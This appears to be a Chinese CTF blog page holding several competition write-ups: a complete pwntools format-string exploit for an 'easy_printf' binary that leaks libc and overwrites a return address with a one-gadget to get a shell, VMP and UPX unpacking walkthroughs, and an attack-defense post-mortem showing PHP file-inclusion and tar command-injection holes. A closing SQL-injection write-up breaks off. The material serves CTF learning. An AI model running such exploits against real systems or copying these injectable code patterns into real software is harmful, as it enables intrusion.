<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> ► 0x40089f &lt;func1+57&gt;    mov    eax, 0</span><br><span class="line">   0x4008a4 &lt;func1+62&gt;    call   func2 &lt;0x4007fa&gt;</span><br><span class="line"> </span><br><span class="line">   0x4008a9 &lt;func1+67&gt;    mov    eax, 0</span><br><span class="line">   0x4008ae &lt;func1+72&gt;    mov    rcx, qword ptr [rbp - 8]</span><br><span class="line">   0x4008b2 &lt;func1+76&gt;    xor    rcx, qword ptr fs:[0x28]</span><br><span class="line">   0x4008bb &lt;func1+85&gt;    je     func1+92 &lt;0x4008c2&gt;</span><br><span class="line"> </span><br><span class="line">   0x4008bd &lt;func1+87&gt;    call   0x400648</span><br><span class="line"> </span><br><span class="line">   0x4008c2 &lt;func1+92&gt;    leave  </span><br><span class="line">   0x4008c3 &lt;func1+93&gt;    ret    </span><br><span class="line"> </span><br><span class="line">   0x4008c4 &lt;main&gt;        push   rbp</span><br><span class="line">   0x4008c5 &lt;main+1&gt;      mov    rbp, rsp</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ rsi rsp  0x7fffc9a192f0 ◂— 0x4141414141414141 (&#x27;AAAAAAAA&#x27;)</span><br><span class="line">01:0008│          0x7fffc9a192f8 —▸ 0x7fe173507690 (_IO_file_underflow+496) ◂— 0xe8df8948fffffeff</span><br><span class="line">02:0010│          0x7fffc9a19300 —▸ 0x7fe173852540 (_IO_2_1_stderr_) ◂— 0xfbad2087</span><br></pre></td></tr></table></figure>

<p>名字下面残留有<code>stderr</code>，所以读取名字时,<code>partial overwrite</code>改为<code>_IO_2_1_stdout_-&gt;_fileno</code>，然后把<code>_fileno</code>改为2即可，后面的和<code>pwnable.tw</code>没什么区别，有了泄露，也有了无限格式化字符串攻击，随便怎么玩</p>
<p>exp为:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmtstr</span>(<span class="params">offset, addr, data, written</span>):</span></span><br><span class="line">	cnt = <span class="number">0</span></span><br><span class="line">	payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	address = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">		cur = <span class="built_in">ord</span>(x)</span><br><span class="line">		<span class="keyword">if</span> cur &gt;= written&amp;<span class="number">0xff</span>:</span><br><span class="line">			to_add = cur - (written&amp;<span class="number">0xff</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			to_add = <span class="number">0x100</span> + cur - (written&amp;<span class="number">0xff</span>)</span><br><span class="line">		<span class="built_in">round</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">		<span class="keyword">if</span> to_add != <span class="number">0</span>:</span><br><span class="line">			<span class="built_in">round</span> += <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(to_add)</span><br><span class="line">		<span class="built_in">round</span> += <span class="string">&quot;%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>(offset+cnt+<span class="built_in">len</span>(data)*<span class="number">2</span>)</span><br><span class="line">		<span class="keyword">assert</span>(<span class="built_in">len</span>(<span class="built_in">round</span>) &lt;= <span class="number">0x10</span>)</span><br><span class="line">		written += to_add + <span class="number">0x10</span> - <span class="built_in">len</span>(<span class="built_in">round</span>)</span><br><span class="line">		payload += <span class="built_in">round</span>.ljust(<span class="number">0x10</span>, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">		address += p64(addr+cnt)</span><br><span class="line">		cnt+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> payload + address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">host,port=<span class="number">12001</span></span>):</span></span><br><span class="line">	<span class="keyword">if</span> host:</span><br><span class="line">		p = remote(host,port)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="comment"># p = process(&quot;./easy_printf&quot;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so&quot;&#125;)</span></span><br><span class="line">		p = process(<span class="string">&quot;./easy_printf&quot;</span>)</span><br><span class="line">		gdb.attach(p,<span class="string">&quot;b *0x000000000400846&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;write down your name&quot;</span>)</span><br><span class="line">	<span class="comment"># t = raw_input(&#x27;guess: &#x27;)</span></span><br><span class="line">	t = <span class="number">0x7</span></span><br><span class="line">	stdout_fileno = (<span class="built_in">int</span>(t) &lt;&lt; <span class="number">12</span>) | <span class="number">0x690</span></span><br><span class="line">	p.send(<span class="string">&quot;A&quot;</span>*<span class="number">0x10</span>+p16(stdout_fileno))</span><br><span class="line">	pause()</span><br><span class="line">	</span><br><span class="line">	buf_addr = <span class="number">0x601060</span></span><br><span class="line">	payload =  <span class="string">&quot;%&#123;&#125;c%28$hhn%&#123;&#125;c%58$hn&quot;</span>.<span class="built_in">format</span>(<span class="number">2</span>,<span class="number">0x2a6</span>).ljust(<span class="number">0x18</span>,<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">	payload += fmtstr(<span class="number">9</span>,buf_addr,p64(<span class="number">0x000000000400814</span>)[:<span class="number">3</span>],<span class="number">0x2ab</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line">	pause()</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	payload =  <span class="string">&quot;%&#123;&#125;c%23$hhn%35$p-%36$p^%37$p-%38$p-%39$p*%40$p-&quot;</span>.<span class="built_in">format</span>(<span class="number">0x14</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line">	pause()</span><br><span class="line">	p.recvuntil(<span class="string">&quot;^&quot;</span>)</span><br><span class="line">	stack = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;-&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">	libc.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;-&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0x20837</span></span><br><span class="line">	info(<span class="string">&quot;stack : &quot;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">	info(<span class="string">&quot;libc : &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line">	onegadget = <span class="number">0xf1147</span>+libc.address</span><br><span class="line">	</span><br><span class="line">	ret_addr = stack - <span class="number">0x1e8</span></span><br><span class="line">	payload =  <span class="string">&quot;%&#123;&#125;c%23$hhn&quot;</span>.<span class="built_in">format</span>(<span class="number">0x14</span>).ljust(<span class="number">0x10</span>,<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">	payload += fmtstr(<span class="number">15</span>,ret_addr,p64(onegadget)[:<span class="number">2</span>],<span class="number">0x19</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line">	pause()</span><br><span class="line">	<span class="comment"># :0000000000400865                 retn</span></span><br><span class="line">	offset = <span class="number">13</span></span><br><span class="line">	payload =  <span class="string">&quot;%&#123;&#125;c%16$hhn%&#123;&#125;c%17$hn&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(p64(onegadget)[<span class="number">2</span>:<span class="number">3</span>]),<span class="number">0x865</span>-<span class="built_in">ord</span>(p64(onegadget)[<span class="number">2</span>:<span class="number">3</span>])).ljust(<span class="number">0x18</span>,<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">	payload += p64(ret_addr+<span class="number">2</span>)+p64(ret_addr-<span class="number">8</span>)</span><br><span class="line">	payload = payload.ljust(<span class="number">0x80</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line">	p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	libc = ELF(<span class="string">&quot;./libc.so&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">	main(args[<span class="string">&#x27;REMOTE&#x27;</span>])</span><br></pre></td></tr></table></figure>



<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="bwarm"><a href="#bwarm" class="headerlink" title="bwarm"></a>bwarm</h3><p>首先，还是查壳，没啥说的 vmp2.0.7</p>
<p> 根据vmp系列脱壳教程，这个壳是1.8以上的方案进行脱壳。先拖入OD，下一个API断点  VirtualProtect (教程建议是下硬件断点，可能是我的OD有问题，硬件断点断不下来，只能是F2断点了 T_T)</p>
<p>然后F9开始跑，测试到第5次跑飞……</p>
<p>那么就在第四次的时开始候单步跟踪，先跳出VirtualProtect 函数 ，然后对代码段设置，内存访问断点</p>
<p>然后F9继续运行，断下来后，在ESP的地方跟踪内存数据，找到SEH结构化异常的上面35C地址那块，下一个硬件写入断点，并取消之前的内存访问断点</p>
<p>然后继续F9运行，再次断下来，这次再在代码断下内存访问断点，然后多次F9运行，注意观察栈帧的变化，快到SEH的地方就接近OEP了，此时已经跟踪到解压后的代码段，然后进行一下代码分析。</p>
<p>完成分析后，代码就还原了，然后单步跟踪，发现OEP </p>
<p>发现OEP后，同时我们也注意到栈帧部分被压入了3条数据，这个就是VMP偷取的代码，我们需要进行还原，于是在当前位置查找一段 0000000000的内存段</p>
<p>然后，对VMP偷取的代码进行patch。最后跳转到OEP 也就是 jmp 012319C9</p>
<p>接着我们把当前的 01231FB5 设置为新的EIP，就可以进行dump内存操作了，填好起始地址和入口地址后，点击脱壳</p>
<p>把脱壳的文件保存为 dump.exe 然后尝试运行，发现不能运行，直接崩溃掉了</p>
<p>于是猜到可能是重定向表的问题造成，用PE编辑器修改一下这里，然后保存。</p>
<p>再次运行，OK ！！</p>
<p>然后可以载入OD进行动态分析了。</p>
<p>为了方便调试，我们知道程序运行后，会提示输入字符串，那么我们先找到输入字符串的地方。</p>
<p>然后开始单步跟踪到这里，就是完成字符串输入后</p>
<p>继续跟踪，我们发现一个base64的字符串：dQkLdqXP=mLMAa8p=lnncQcq/GEPdGKXcNDl=Mnr=pcoBGPQdG1NA3Aw</p>
<p>那么另外一个字符串就是base64的字典了，也就是：0123456789+/=ABCDEFGHIabcdefghiJKLMNOPQRSTUVWXYZjklmnopqrstuvwxyz</p>
<p>于是，我们就可以根据这个对base64zi’f字符串进行解密：</p>
<p>坑了，竟然是乱码，还以为就这样搞定了呢，后来请教了一下大神，他说是字典有问题，于是我仔细的看了一下，确实</p>
<p>字典里面按说是不应该有‘=’ 这个字符的，按base64的说法这个是占位用的来补足字节数。所以按照大神的指点，我把大神的脚本用C++重新写了一遍（也是为了更好的理解反向分析的过程），终了跑出来了 T_T</p>
<p>最后，就是见证奇迹的时刻到了 * ^_^ *</p>
<p>flag{e38b5b63-4bf7-4ee8-b422-83f599fe0c43}</p>
<h3 id="Md5Jungle"><a href="#Md5Jungle" class="headerlink" title="Md5Jungle"></a>Md5Jungle</h3><p>首先查壳，丢到exeinfope里面一看，发现是asp的壳。</p>
<p>于是用手头的asp脱壳工具尝试脱壳，发现都不行，不是不支持就是报错！没办法，只能老实手工脱壳了。</p>
<p>根据ESP定律+IAT修复+重定向表修复后，脱壳的程序可以正常运行。</p>
<p>用OD载入后，开始单步跟踪</p>
<p>到用户输入界面，我随便输入了个字符串：111111111（9个1）单步跟入到下图，发现了flag字样</p>
<p>这个应该是flag的头，于是继续跟进，发现确实在核对输入数据与flag{比较，这块就过不去了</p>
<p>于是果断的从来，输入数据为 flag{111111111，来到了下图的地方，在0x16的位置比较0x7D 也就是’}’符号</p>
<p>由于C语言的字符串下标是从0开始的，也就是字符串第23个字符处必须是}</p>
<p>于是构造字符串：flag{11111111111111111} 继续跟进，接下来是在0x7、0xc、0x11处核对字符 ‘-‘ (即：0x2D)</p>
<p>于是字符串就变成了flag{11-1111-1111-1111}，继续跟进，发现了一个字符串：01E3421C=dump_SCY.01E3421C (ASCII “c7218260ef2b966ab0454e07c55cf4e9”)<br>感觉像是MD5的字符串，于是用python解了一下，得到： oh，结之前的flag应该就是flag{oh-1111-1111-1111}</p>
<p>再次输入后，继续跟进发现过去了，开始进行第二段的比较得到了下图的错误：</p>
<p>于是反复跟比较算法也没有找到任何有效的数据，结合本题的提示是md5段字节爆破，估计是这块需要进行爆破处理了。</p>
<p>于是继续python大法，得到字符串：flag{oh-aa30-1111-1111}</p>
<p>继续输入后，单步跟进，此时发现一个字符串：堆栈地址=001DFC30, (ASCII “YTkxYQ==”)   eax=786B5459<br>看起来像B64编码，于是尝试解码，得到第三组的flag值：a91a 。</p>
<p>想起之前用od也看过字符串，于是找到第四组的字符串：NGZicA==   ，解码为：4fbp</p>
<p>那么最终的flag就是：flag{oh-aa30-a91a-4fbp}</p>
<h3 id="shy"><a href="#shy" class="headerlink" title="shy"></a>shy</h3><p> 首先查壳，丢到ExeinfoPE里面看一下，确定是upx壳</p>
<p>于是丢到OD里面进行脱壳处理，由于是压缩壳，跟踪起来比较麻烦，我选择了个偷懒的办法，下一个api访问断点</p>
<p>即：VirtualProtect ，运行3次F9后就跑飞了，于是在2次运行后，单步跟踪，到OEP</p>
<p>使用OD自带的插件进行脱壳，注意基址和OEP的关系，计算好后填入</p>
<p>然后点击脱壳，双击发现不能运行。</p>
<p>这个问题估计是重定向造成，于是修复一下重定向表的数据。</p>
<p>保存后，再次运行可以正常跑起来了</p>
<p>再次用OD载入，发现入口地址不是OEP</p>
<p>按说是已经解密完成了，于是我定位到OEP （0x1072940）一看究竟。</p>
<p>确实已经解密，那么为了方便调试，我直接用OD改一下入口代码就可以实现了。</p>
<p>然后把修改完毕的程序，重新保存到文件，由于有重定位会有下图的提示，点击 是 ，然后右键保存一份dump0.exe</p>
<p>继续，OD载入dump0.exe 发现修改成功，可以直接跳转到OEP行，然后单步跟踪，到输入后，发现后面的代码是个加密处理的代码，于是丢到IDA里面看一下这块对应的反编译代码。</p>
<p>buf 就是用户输入的字符串，if ( <em>(&amp;v4 + j) != v79[j] )   这个就是关键的比较，那么V79[]就应该是异或后的结果，也就是ben本题的密钥，于是在OD中定位值：6ljh,!;:+&amp;p%i</em>a=Sc4#pt*%</p>
<p>接下来就简单了，直接把这个密钥输入，然后再次定位到这块就能得到flag了</p>
<p>最终得到flag：flag{cb7670ab-c597-4b17}   输入到shy.exe 验证一下 : )</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/04/19/byb2019/" data-id="ckw63s4lb0037flole05jb042" data-title="百越杯2019" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-byb2019线下awd" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/19/byb2019%E7%BA%BF%E4%B8%8Bawd/" class="article-date">
  <time class="dt-published" datetime="2020-04-19T16:00:00.000Z" itemprop="datePublished">2020-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/19/byb2019%E7%BA%BF%E4%B8%8Bawd/">百越杯总结</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="百越杯总结"><a href="#百越杯总结" class="headerlink" title="百越杯总结"></a>百越杯总结</h1><h2 id="include-require"><a href="#include-require" class="headerlink" title="include,require"></a>include,require</h2><p>如果<strong>文件被包含两次</strong>，PHP 5   <strong>发出致命错误</strong>因为函数已经被定义，但是 PHP 4 不会对在   <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.return.html">return</a> 之后定义的函数报错。推荐使用   <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.include-once.html">include_once</a> 而不是检查文件是否已包含并在包含文件中有条件返回。 </p>
<h2 id="include-once-require-once"><a href="#include-once-require-once" class="headerlink" title="include_once,require_once"></a>include_once,require_once</h2><p><em>include_once</em> 语句在脚本执行期间包含并运行指定文件。此行为和   <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.include.html">include</a>   语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含。如同此语句名字暗示的那样，只会包含一次。</p>
<p><em>require_once</em> 语句和 <a href="mk:@MSITStore:D:\ctf\手册\php_manual_zh.chm::/res/function.require.html">require</a>   语句完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。 </p>
<p><strong>如果所包含文件不存在,include_once不会退出,而require_once会直接退出</strong></p>
<h2 id="比赛失误原因"><a href="#比赛失误原因" class="headerlink" title="比赛失误原因"></a>比赛失误原因</h2><h3 id="log没挂好"><a href="#log没挂好" class="headerlink" title="log没挂好"></a>log没挂好</h3><h3 id="没有找到有效的攻击流量"><a href="#没有找到有效的攻击流量" class="headerlink" title="没有找到有效的攻击流量"></a>没有找到有效的攻击流量</h3><p>grep这个命令不够熟悉,</p>
<h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p>我的过滤条件变迁:</p>
<p><code>&quot;flag&quot; =&gt; &quot;/flag&quot;</code>,到这里后我就没有继续过滤,”/flag”其实还是有很多干扰信息的,我就差一步</p>
<p><code>grep &quot;/flag &quot; */* </code></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91fl7ptrij30k20arac7.jpg" alt="image.png"></p>
<p><code>grep &quot;/flag &quot; */* -C300 | grep &quot;end pageheader&quot; -C 10</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91fk6h3jxj30oa05cdfx.jpg" alt="image.png"></p>
<h3 id="没找到的洞"><a href="#没找到的洞" class="headerlink" title="没找到的洞"></a>没找到的洞</h3><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c2qcxxyj30pl01vdgk.jpg" alt="image.png"></p>
<p>php的web主要也就这两的洞</p>
<h4 id="grayscale"><a href="#grayscale" class="headerlink" title="grayscale"></a>grayscale</h4><p><code>include $_GET[&#39;img&#39;];</code>配合有后门的图片m.jpg</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c4zci7cj30f001g3yg.jpg" alt="image.png"></p>
<p>开始我直接搜索<code>&lt;?</code>和<code>&lt;%</code> 没搜索到就以为是误报,??也能执行?????</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c93p00wj307100zjr6.jpg" alt="image.png"></p>
<p>用strings查看////,编码问题导致??,以后用ascii码来查看</p>
<h4 id="ssystem"><a href="#ssystem" class="headerlink" title="ssystem"></a>ssystem</h4><p>虽然找到了exec那个洞</p>
<p>但是在index.php中：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$page</span> = <span class="string">&#x27;chart.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include_once</span> <span class="string">&quot;<span class="subst">$page</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以配合文件上传拿到shell或者是直接include /flag也能拿到flag</p>
<h3 id="洞没修好"><a href="#洞没修好" class="headerlink" title="洞没修好"></a>洞没修好</h3><h4 id="SSystem"><a href="#SSystem" class="headerlink" title="SSystem"></a>SSystem</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    exec(<span class="string">&quot;tar -cf backup/<span class="subst">$name</span> images/*.jpg&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=\&quot;alert alert-success\&quot; role=\&quot;alert\&quot;&gt;</span></span><br><span class="line"><span class="string">            导出成功,&lt;a href=&#x27;backup/<span class="subst">$name</span>&#x27;&gt;点击下载&lt;/a&gt;&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>原本以为<code>$name</code>再参数位置,用escapeshellarg就可以了</p>
<p>但是!!!!!!!虽然escapeshellarg会把$name放在引号里面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。 </span><br></pre></td></tr></table></figure>

<p>php手册里解释是单引号,实际却是<code>tar -cf backup/&quot;123&quot; images/*.jpg</code></p>
<p>?????这是在我本机php5.6的环境下,php7环境也是双引号???</p>
<p>然后在自己的服务器上之前是双引号后面是单引号????</p>
<p>由于不知道靶场上会怎样,我也不确定我用escapeshellarg是不是修好了,然后这题就修补失败了</p>
<p>比较好的修复方案(在实现原功能的情况下去掉命令执行):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;tar -cf backup/aa.tar images/*.jpg&quot;);</span><br><span class="line">rename(&quot;backup/aa.tar&quot;,&quot;backup/$name.tar&quot;);</span><br></pre></td></tr></table></figure>





<h3 id="没找到check没过的原因"><a href="#没找到check没过的原因" class="headerlink" title="没找到check没过的原因"></a>没找到check没过的原因</h3><p>check的id是172.16.4.7</p>
<p>但是直接搜索 HTTP 没找到check没过的原因,我猜因为拖下来的log只有前半小时,而开局的是否我们的check好像是过的</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我看到洞的时候没有修好</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/04/19/byb2019%E7%BA%BF%E4%B8%8Bawd/" data-id="ckw63s4lc003aflol4jihgsip" data-title="百越杯总结" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-bytectfwp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/19/bytectfwp/" class="article-date">
  <time class="dt-published" datetime="2020-04-19T16:00:00.000Z" itemprop="datePublished">2020-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/19/bytectfwp/">bytectf wp</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="bytectf-wp"><a href="#bytectf-wp" class="headerlink" title="bytectf wp"></a>bytectf wp</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="baby-blog"><a href="#baby-blog" class="headerlink" title="baby_blog"></a>baby_blog</h3><p>在edit.php中:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="variable">$row</span>[<span class="string">&#x27;userid&#x27;</span>])&#123;</span><br><span class="line">		<span class="variable">$title</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">		<span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">		<span class="variable">$sql</span>-&gt;query(<span class="string">&quot;update article set title=&#x27;<span class="subst">$title</span>&#x27;,content=&#x27;<span class="subst">$content</span>&#x27; where title=&#x27;&quot;</span> . <span class="variable">$row</span>[<span class="string">&#x27;title&#x27;</span>] . <span class="string">&quot;&#x27;;&quot;</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p><code>$sql-&gt;query(&quot;update article set title=&#39;$title&#39;,content=&#39;$content&#39; where title=&#39;&quot; . $row[&#39;title&#39;] . &quot;&#39;;&quot;);</code></p>
<p>$row[‘title’] 没有进行任何过滤,直接插入到sql语句中,而插入数据库中的title没有再次对引号进行转义,形成注入点</p>
<p>sql盲注判断脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 